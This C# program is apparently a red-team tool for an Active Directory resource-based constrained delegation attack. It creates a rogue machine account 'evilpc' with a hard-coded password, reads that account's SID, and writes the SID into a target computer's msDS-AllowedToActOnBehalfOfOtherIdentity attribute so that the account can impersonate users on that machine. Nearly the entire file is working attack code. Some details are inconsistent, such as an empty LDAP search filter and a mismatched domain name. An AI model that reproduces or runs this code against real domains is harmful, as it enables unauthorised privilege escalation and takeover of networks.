using System;
using System.Security.Principal;
using System.DirectoryServices;
using System.Text;
using System.Security.AccessControl;

namespace RBCDElevatePrivilege {
    class Program {
        static void GetPrivilege() {
            DirectoryEntry ldap_connect = new DirectoryEntry("gh0st.com");
            ldap_connect.Path = "LDAP://CN=Computers,DC=gh0st,DC=com";
            ldap_connect.Options.SecurityMasks = SecurityMasks.Dacl;
            ldap_connect.RefreshCache();

            ActiveDirectorySecurity sec = ldap_connect.ObjectSecurity;
            foreach (ActiveDirectoryAccessRule ar in sec.GetAccessRules(true, true, typeof(NTAccount))) {
                Console.WriteLine(ar.IdentityReference.ToString() + " -> " + ar.ActiveDirectoryRights.ToString() + "\n");
            }
        }
        static void Main(string[] args) {
            String DomainController = "192.168.127.129";
            String Domain = "gh0st.com";
            //String username = args[0]; //域用户名
            //String password = args[1]; //域用户密码
            String new_MachineAccount = "evilpc"; //添加的机器账户
            String new_MachineAccount_password = "123456"; //机器账户密码
            String victimcomputer_ldap_path = "LDAP://CN=Computers,DC=gh0st,DC=com";
            String machine_account = new_MachineAccount;
            String sam_account = machine_account + "$";

            String distinguished_name = "";
            String[] DC_array = null;
            distinguished_name = "CN=" + machine_account + ",CN=Computers";
            DC_array = Domain.Split('.');
            foreach (String DC in DC_array) {
                distinguished_name += ",DC=" + DC;
            }
            Console.WriteLine("[+] Elevate permissions on ");
            Console.WriteLine("[+] Domain = " + Domain);
            Console.WriteLine("[+] Domain Controller = " + DomainController);
            //Console.WriteLine("[+] New SAMAccountName = " + sam_account);
            //Console.WriteLine("[+] Distinguished Name = " + distinguished_name);
            //连接ldap
            System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = new System.DirectoryServices.Protocols.LdapDirectoryIdentifier(DomainController, 389);
            //NetworkCredential nc = new NetworkCredential(username, password); //使用凭据登录
            System.DirectoryServices.Protocols.LdapConnection connection = null;
            //connection = new System.DirectoryServices.Protocols.LdapConnection(identifier, nc);
            connection = new System.DirectoryServices.Protocols.LdapConnection(identifier);
            connection.SessionOptions.Sealing = true;
            connection.SessionOptions.Signing = true;
            connection.Bind();
            var request = new System.DirectoryServices.Protocols.AddRequest(distinguished_name, new System.DirectoryServices.Protocols.DirectoryAttribute[] {
                new System.DirectoryServices.Protocols.DirectoryAttribute("DnsHostName", machine_account +"."+ Domain),
                new System.DirectoryServices.Protocols.DirectoryAttribute("SamAccountName", sam_account),
                new System.DirectoryServices.Protocols.DirectoryAttribute("userAccountControl", "4096"),
                new System.DirectoryServices.Protocols.DirectoryAttribute("unicodePwd", Encoding.Unicode.GetBytes("\"" + new_MachineAccount_password + "\"")),
                new System.DirectoryServices.Protocols.DirectoryAttribute("objectClass", "Computer"),
                new System.DirectoryServices.Protocols.DirectoryAttribute("ServicePrincipalName", "HOST/"+machine_account+"."+Domain,"RestrictedKrbHost/"+machine_account+"."+Domain,"HOST/"+machine_account,"RestrictedKrbHost/"+machine_account)
            });
            try {
                //添加机器账户
                connection.SendRequest(request);
                Console.WriteLine("[+] Machine account: " + machine_account + " Password: " + new_MachineAccount_password + " added");
            } catch (System.Exception ex) {
                Console.WriteLine("[-] The new machine could not be created! User may have reached ms-DS-new_MachineAccountQuota limit.)");
                Console.WriteLine("[-] Exception: " + ex.Message);
                return;
            }
            // 获取新计算机对象的SID
            var new_request = new System.DirectoryServices.Protocols.SearchRequest(distinguished_name, "(&(samAccountType=805306369)(|(name=" + machine_account + ")))", System.DirectoryServices.Protocols.SearchScope.Subtree, null);
            var new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request);
            SecurityIdentifier sid = null;
            foreach (System.DirectoryServices.Protocols.SearchResultEntry entry in new_response.Entries) {
                try {
                    sid = new SecurityIdentifier(entry.Attributes["objectsid"][0] as byte[], 0);
                    Console.Out.WriteLine("[+] " + new_MachineAccount + " SID : " + sid.Value);
                } catch {
                    Console.WriteLine("[!] It was not possible to retrieve the SID.\nExiting...");
                    return;
                }
            }
            //设置资源约束委派
            System.DirectoryServices.DirectoryEntry myldapConnection = new System.DirectoryServices.DirectoryEntry("redteam.com");
            myldapConnection.Path = victimcomputer_ldap_path;
            myldapConnection.AuthenticationType = System.DirectoryServices.AuthenticationTypes.Secure;
            System.DirectoryServices.DirectorySearcher search = new System.DirectoryServices.DirectorySearcher(myldapConnection);
            //通过ldap找计算机
            search.Filter = "(CN=" + ")";
            string[] requiredProperties = new string[] { "samaccountname" };
            foreach (String property in requiredProperties)
                search.PropertiesToLoad.Add(property);
            System.DirectoryServices.SearchResult result = null;
            try {
                result = search.FindOne();
            } catch (System.Exception ex) {
                Console.WriteLine(ex.Message + "Exiting...");
                return;
            }
            if (result != null) {
                System.DirectoryServices.DirectoryEntry entryToUpdate = result.GetDirectoryEntry();
                String sec_descriptor = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + sid.Value + ")";
                System.Security.AccessControl.RawSecurityDescriptor sd = new RawSecurityDescriptor(sec_descriptor);
                byte[] descriptor_buffer = new byte[sd.BinaryLength];
                sd.GetBinaryForm(descriptor_buffer, 0);
                // 添加evilpc的sid到msds-allowedtoactonbehalfofotheridentity中
                entryToUpdate.Properties["msds-allowedtoactonbehalfofotheridentity"].Value = descriptor_buffer;
                try {
                    entryToUpdate.CommitChanges();//提交更改
                    Console.WriteLine("[+] Exploit successfully!");
                } catch (System.Exception ex) {
                    Console.WriteLine(ex.Message);
                    Console.WriteLine("[!] \nFailed...");
                    return;
                }
            }
        }
    }
}
